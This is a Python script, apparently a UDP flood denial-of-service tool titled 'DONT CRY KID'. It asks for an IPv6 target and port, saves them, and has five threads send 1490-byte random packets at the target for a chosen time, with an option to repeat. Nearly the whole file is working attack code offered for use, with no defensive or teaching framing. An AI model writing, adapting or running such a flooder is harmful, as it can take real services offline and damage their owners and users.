import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
import keyboard
import platform
import configparser
from colorama import init, Fore, Back, Style

# Initialize colorama
init(autoreset=True)

def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def display_header():
    clear_screen()
    # Custom styled header
    print(Fore.CYAN + Back.BLACK + Style.BRIGHT + """
▓█████▄  ▒█████   ███▄    █ ▄▄▄█████▓    ▄████▄   ██▀███ ▓██   ██▓    ██ ▄█▀ ██▓▓█████▄ 
▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒   ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒    ██▄█▒ ▓██▒▒██▀ ██▌
░██   █▌▒██░  ██▒▓██  ▀█ ██▒▒ ▓██░ ▒░   ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░   ▓███▄░ ▒██▒░██   █▌
░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒░ ▓██▓ ░    ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░   ▓██ █▄ ░██░░▓█▄   ▌
░▒████▓ ░ ████▓▒░▒██░   ▓██░  ▒██▒ ░    ▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░   ▒██▒ █▄░██░░▒████▓ 
 ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒   ▒ ░░      ░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒    ▒ ▒▒ ▓▒░▓   ▒▒▓  ▒ 
 ░ ▒  ▒   ░ ▒ ▒░ ░ ░░   ░ ▒░    ░         ░  ▒     ░▒ ░ ▒░▓██ ░▒░    ░ ░▒ ▒░ ▒ ░ ░ ▒  ▒ 
 ░ ░  ░ ░ ░ ░ ▒     ░   ░ ░   ░         ░          ░░   ░ ▒ ▒ ░░     ░ ░░ ░  ▒ ░ ░ ░  ░ 
   ░        ░ ░           ░             ░ ░         ░     ░ ░        ░  ░    ░     ░    
 ░                                      ░                 ░ ░                    ░      
    """)

    print(Fore.YELLOW + f"Made by: Dachi Wolf")
    print(Fore.GREEN + f"GitHub: https://github.com/SexyWerewolf")

def get_last_ip_port():
    config = configparser.ConfigParser()
    try:
        config.read('config.ini')
        ip = config.get('Settings', 'IP')
        port = config.getint('Settings', 'Port')
        loop = config.getboolean('Settings', 'Loop', fallback=True)
        attack_time = config.getfloat('Settings', 'Time', fallback=1.0)
        return ip, port, loop, attack_time
    except (FileNotFoundError, configparser.NoSectionError, configparser.NoOptionError):
        return None, None, None, None

def save_ip_port(ip, port, loop, attack_time):
    config = configparser.ConfigParser()
    config['Settings'] = {
        'IP': ip,
        'Port': str(port),
        'Loop': str(loop),
        'Time': str(attack_time)
    }
    with open('config.ini', 'w') as configfile:
        config.write(configfile)

sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
rnumber = random.randint(363, 6893)

def print_progress_bar(elapsed_time, total_time, length=50):
    progress = (elapsed_time / total_time) * length
    bar = "█" * int(progress) + "-" * (length - int(progress))
    percent = (elapsed_time / total_time) * 100
    remaining_time = max(0, total_time - elapsed_time)
    minutes, seconds = divmod(int(remaining_time), 60)
    sys.stdout.write(f"\r[{bar}] {percent:.2f}% Time remaining: {minutes:02d}:{seconds:02d}")
    sys.stdout.flush()

def attack():
    global attack_running, pause_requested
    sent = 0
    start_time = time.time()
    while attack_running:
        if pause_requested:
            print("\nTest paused. Press 'p' to resume or 'q' to quit.")
            while pause_requested:
                if keyboard.is_pressed('p'):
                    pause_requested = False
                    print("Resuming...\n")
                    break
                if keyboard.is_pressed('q'):
                    print("Quitting and restarting the test...\n")
                    attack_running = False
                    return

        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
        except OSError as e:
            if e.errno == 10065:
                print(f"Error: Unable to reach {ip}:{port}. Retrying...")
                continue
            else:
                raise

        elapsed_time = time.time() - start_time
        if elapsed_time >= attack_time:
            print(f"\nAttack stopped after {attack_time} seconds.")
            attack_running = False
            return

        print_progress_bar(elapsed_time, attack_time)

def start_attack():
    global attack_running
    attack_running = True
    print("Starting attack...")

    threads_list.clear()
    number_of_threads = 5

    for _ in range(number_of_threads):
        thread = threading.Thread(target=attack)
        threads_list.append(thread)
        thread.start()

def get_ip_and_port():
    ip, port, loop, attack_time = get_last_ip_port()
    
    if ip and port:
        print(f"Using last saved IP: {ip} and Port: {port}")
    else:
        ip = input("IP Target (IPv6): ")
        port = int(input("Port       : "))
        loop = input("Loop (true/false): ").lower() == "true"
        attack_time = float(input("Attack Time in seconds (e.g. 1.5 for 1500ms): "))
        save_ip_port(ip, port, loop, attack_time)
    
    return ip, port, loop, attack_time

def main():
    global ip, port, attack_time, pause_requested, loop
    display_header()  # Display header when the script starts
    while True:
        ip, port, loop, attack_time = get_ip_and_port()

        pause_requested = False
        start_attack()

        while attack_running:
            time.sleep(1)

        print("\nAttack finished.")
        
        if not loop:
            break

        print("\nStarting new attack...\n")
        clear_screen()

threads_list = []

if __name__ == "__main__":
    main()
